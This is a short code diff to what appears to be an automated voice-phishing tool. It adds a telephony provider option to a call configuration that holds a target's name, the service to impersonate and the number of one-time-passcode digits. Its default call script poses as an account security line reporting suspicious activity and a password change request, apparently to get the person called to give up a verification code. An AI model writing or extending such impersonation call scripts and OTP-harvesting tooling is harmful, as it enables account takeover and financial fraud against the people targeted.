@@ -88,6 +88,7 @@ class CallConfig(BaseModel):
     recipient_name: Optional[str] = None
     service_name: Optional[str] = None
     otp_digits: int = 6
+    provider: str = "infobip"  # "infobip" or "signalwire"
 
 class CallSteps(BaseModel):
     step1: str = "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0."
